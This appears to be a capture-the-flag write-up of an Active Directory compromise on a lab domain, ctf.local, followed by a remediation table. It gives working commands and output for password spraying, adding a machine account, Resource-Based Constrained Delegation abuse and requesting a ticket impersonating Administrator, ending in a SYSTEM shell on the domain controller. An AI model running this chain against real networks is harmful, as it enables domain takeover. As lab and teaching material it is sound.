Attack Chain Summary

  1. Reconnaissance & BloodHound:
    - nmap -sV -sC 10.48.167.228 -Pn identified Active Directory domain services on DC01.ctf.local.

    nxc smb DC01.ctf.local -u user.txt -p '********' --continue-on-success
    ➔ Successfully compromised r.williams:********.
  3. Privilege Escalation via RBCD (Resource-Based Constrained Delegation):
    - BloodHound revealed r.williams has AddAllowedToAct permissions on DC01.ctf.local.
    - Created machine account ATTACKER$ with password ******** using impacket-addcomputer -method SAMR.
    - Configured RBCD delegation using impacket-rbcd allowing ATTACKER$ to act on behalf of DC01$.

    - Exported ticket cache and executed impacket-psexec -k -no-pass DC01.ctf.local to gain an interactive nt authority\system shell.

4. Phase 3: Privilege Escalation via RBCD (Resource-Based Constrained Delegation)

4.1 Vulnerability Identification

In BloodHound, r.williams has AddAllowedToAct privileges over DC01.CTF.LOCAL:

4.2 Step 1: Adding a Machine Account (ATTACKER$)

Using impacket-addcomputer with SAMR protocol:

impacket-addcomputer -method SAMR \
  -computer-name 'ATTACKER$' \
  -computer-pass 'P@ssw0rd123!' \
  -dc-ip 10.48.167.228 \
  'ctf.local/r.williams:********'


[*] Successfully added machine account ATTACKER$ with password ********.

4.3 Step 2: Configuring RBCD on DC01

We write ATTACKER$ into the msDS-AllowedToActOnBehalfOfOtherIdentity attribute of DC01$:

impacket-rbcd -delegate-from 'ATTACKER$' \
  -delegate-to 'DC01$' \
  -action write \
  -dc-ip 10.48.167.228 \
  'ctf.local/r.williams:********'


[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] ATTACKER$ can now impersonate users on DC01$ via S4U2Proxy

We verify the delegation configuration:

impacket-rbcd -delegate-to 'DC01$' -action read \
  -dc-ip 10.48.167.228 'ctf.local/r.williams:********'

4.4 Step 3: Requesting Service Ticket via S4U2Proxy

We request a Kerberos service ticket for cifs/DC01.ctf.local impersonating Administrator:

impacket-getST 'ctf.local/ATTACKER$:P@ssw0rd123!' \
  -spn 'cifs/DC01.ctf.local' \
  -impersonate Administrator \
  -dc-ip 10.48.167.228

5. Security Mitigations & Remediation

Vulnerability Impact Recommended Remediation
Abuse of AddAllowedToAct (RBCD) Unprivileged user with write rights on DC object can impersonate Domain Administrator. 1. Audit ACLs on Domain Controller computer objects; ensure only Domain Admins have write permissions to msDS-AllowedToActOnBehalfOfOtherIdentity.
2. Add high-privilege administrative accounts to the Protected Users security group to disable Kerberos delegation.
Default MachineAccountQuota (MAQ) Any domain user can create up to 10 computer accounts (ATTACKER$). Set ms-DS-MachineAccountQuota to 0 in Active Directory.
Credential Reuse (********) Password spraying enables lateral movement and account takeover. Enforce unique passwords, implement MFA, and deploy LAPS.
